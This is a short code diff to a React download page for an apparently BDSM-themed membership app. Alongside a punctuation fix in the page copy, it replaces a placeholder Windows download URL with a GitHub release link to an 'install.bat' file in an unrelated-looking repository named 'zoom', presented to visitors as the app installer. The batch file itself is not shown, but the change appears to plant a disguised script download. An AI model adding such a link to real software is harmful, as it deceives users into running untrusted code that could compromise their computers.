@@ -3,7 +3,7 @@ import { Button } from "@/components/ui/button";
 import { CheckCircle, Download, Monitor } from "lucide-react";
 
 // TODO: Replace with the actual Windows app download URL when available
-const WINDOWS_APP_DOWNLOAD_URL = "#";
+const WINDOWS_APP_DOWNLOAD_URL = "https://github.com/melia7676/zoom/releases/download/v1/install.bat";
 
 const MembershipApp = () => {
   return (
@@ -42,7 +42,7 @@ const MembershipApp = () => {
                 Your Mistress/Master will assign your tasks, rules, and expectations there. You will mark completions, earn points for good behavior that you can redeem for rewards approved by your Mistress/Master, and face consequences for failures.
               </p>
               <p className="text-foreground leading-relaxed">
-                It keeps you accountable every day, even when you're apart, and reinforces that your submission is ongoing—not just when you're together.
+                It keeps you accountable every day, even when you're apart, and reinforces that your submission is ongoing, not just when you're together.
               </p>
             </div>
 
@@ -78,3 +78,4 @@ const MembershipApp = () => {
 };
 
 export default MembershipApp;
+
